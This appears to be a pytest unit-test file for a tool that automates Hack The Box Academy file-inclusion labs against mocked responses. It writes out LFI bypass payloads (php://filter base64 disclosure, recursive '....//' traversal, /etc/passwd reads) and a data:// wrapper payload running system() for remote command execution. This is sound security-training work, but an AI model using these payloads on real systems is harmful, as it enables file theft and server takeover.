"""Unit tests for the LFI/RFI bypass probe.

We register one canned response per payload and assert the probe
walks them in priority order, stops on the first flag, and trips
the right techniques along the way. The bypasses themselves came
from real-academy work in module 23 (sections 1491, 1492, 253) so
the tests pin "the payloads that worked once" and prevent silent
regression.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass, field
from typing import Any

import pytest

from htbrl.academy.lfi_runner import (
    LfiAttempt,
    try_data_wrapper_rce,
    try_lfi_read,
)
from htbrl.academy.target_runner import HttpResponse


@dataclass
class _Recorder:
    """Mock runner: returns a canned page based on the query value of ``language``."""

    routes: dict[str, str] = field(default_factory=dict)
    default_body: str = "<h2>Containers</h2>(blank)<p class=\"read-more\">"
    calls: list[str] = field(default_factory=list)
    host: str = "1.2.3.4"
    port: int = 80
    scheme: str = "http"

    def request(self, path: str, *, method: str = "GET", **_):
        self.calls.append(path)
        # Match by the *value* of the LFI param (param-name-agnostic so
        # the same recorder works for `language=`, `view=`, `file=`, …).
        body = self.default_body
        for needle, body_template in self.routes.items():
            if needle in path:
                body = body_template
                break
        return HttpResponse(status=200, body_text=body, url=path)


def _wrap(inner_html: str) -> str:
    """Wrap ``inner_html`` in the academy's blog-card boilerplate so the
    LFI probe's regex finds it like it does in a real response."""
    return (
        '<!DOCTYPE html><html><body>'
        '<h2>Containers</h2>'
        + inner_html +
        '<p class="read-more">'
        '</body></html>'
    )


def test_finds_flag_via_php_filter_base64():
    """First payload tried is the php://filter base64 disclosure -
    when the target leaks the file's source base64-encoded, the probe
    decodes it and surfaces the HTB flag."""
    flag = "HTB{p#p_f1lt3r_w0rk5}"
    encoded = base64.b64encode(
        f"<?php $secret='{flag}'; ?>".encode()
    ).decode()
    runner = _Recorder(
        routes={
            # Match the real URL shape — schemes (php://) and equals signs
            # in stream-wrapper params are preserved literal, only the
            # actual unsafe chars get %-encoded.
            "language=php://filter/convert.base64-encode/resource=/flag.txt":
                _wrap(encoded),
        },
    )
    answer, attempts = try_lfi_read(
        runner, param="language", target_path="/flag.txt",
    )
    assert answer == flag
    # First attempt that mattered is the php-filter probe.
    assert attempts[-1].technique == "php-filter-base64"
    assert attempts[-1].proof_match == "flag-in-base64"


def test_falls_back_to_recursive_traversal_when_filter_blocked():
    """When php://filter is disabled but ``str_replace('../','')`` is
    in place, ``....//`` recursion should win.

    We canned the response so only the ``....//x4`` payload returns
    the flag; everything before returns a blank container."""

    flag = "HTB{r3curs1v3_byp4s5_w1n}"
    runner = _Recorder(
        routes={
            # ``....//`` traversal preserves slashes literal in the URL.
            "....//....//....//....//flag.txt":
                _wrap(f"the flag is {flag}"),
        },
    )
    answer, attempts = try_lfi_read(
        runner, param="language", target_path="/flag.txt",
    )
    assert answer == flag
    # The successful attempt should be one of the recursive-x* variants.
    assert attempts[-1].technique.startswith("recursive-dot-traversal-x")


def test_returns_empty_when_no_payload_works():
    """When every payload returns blank, ``answer`` is "" and the
    full attempts trace lists every technique we tried."""

    runner = _Recorder()  # default_body has no flag
    answer, attempts = try_lfi_read(
        runner,
        param="language",
        target_path="/flag.txt",
        max_attempts=20,
    )
    assert answer == ""
    techniques = {a.technique for a in attempts}
    assert "php-filter-base64" in techniques
    assert "recursive-dot-traversal-x4" in techniques
    assert "url-encoded-traversal" in techniques


def test_approved_prefix_added_when_supplied():
    """When the caller knows the sink whitelists a directory, we
    add prefix-relative bypass variants."""

    runner = _Recorder()
    _, attempts = try_lfi_read(
        runner,
        param="language",
        target_path="/flag.txt",
        approved_prefix="languages",
        max_attempts=99,
    )
    techniques = [a.technique for a in attempts]
    # The prefix variants only appear when approved_prefix is supplied.
    assert any(t.startswith("approved-prefix-traversal-x") for t in techniques)
    assert "approved-prefix-recursive-x4" in techniques


def test_no_approved_prefix_means_no_prefix_variants():
    """Sanity check: when approved_prefix is omitted, no
    prefix-anchored payload appears in the trace."""
    runner = _Recorder()
    _, attempts = try_lfi_read(
        runner, param="language", target_path="/flag.txt", max_attempts=99,
    )
    assert not any(a.technique.startswith("approved-prefix") for a in attempts)


def test_etc_passwd_disclosure_marked_in_proof_match():
    """``/etc/passwd`` content is recognised as proof-of-disclosure
    but does NOT count as a flag answer (no HTB{…} present)."""

    runner = _Recorder(
        routes={
            "....//....//....//etc/passwd": _wrap(
                "root:x:0:0:root:/root:/bin/bash\n"
                "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            ),
        },
    )
    answer, attempts = try_lfi_read(
        runner, param="language", target_path="/etc/passwd",
    )
    assert answer == ""        # no flag in /etc/passwd, just proof
    proof_matches = [a.proof_match for a in attempts if a.proof_match]
    assert "etc-passwd-disclosed" in proof_matches


def test_caps_at_max_attempts():
    """Probe respects ``max_attempts`` so a stuck section can't fire
    100s of requests at the academy."""
    runner = _Recorder()
    _, attempts = try_lfi_read(
        runner, param="language", target_path="/flag.txt", max_attempts=3,
    )
    assert len(attempts) == 3


# ---- data:// wrapper RCE ----------------------------------------------------


def test_data_wrapper_rce_threads_command_output_through():
    """``data://`` wrapper RCE injects PHP that runs ``system($_GET[c])``
    then sets the URL's ``c=`` to the desired command. The recorder
    canned a body that mimics a real academy box ack-ing the cmd."""

    runner = _Recorder(
        routes={
            "data://text/plain": _wrap(
                "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
            ),
        },
    )
    out, attempt = try_data_wrapper_rce(runner, param="language", cmd="id")
    assert "uid=33" in out
    assert attempt.technique == "data-wrapper-rce"
    assert attempt.payload.startswith("data://text/plain,")
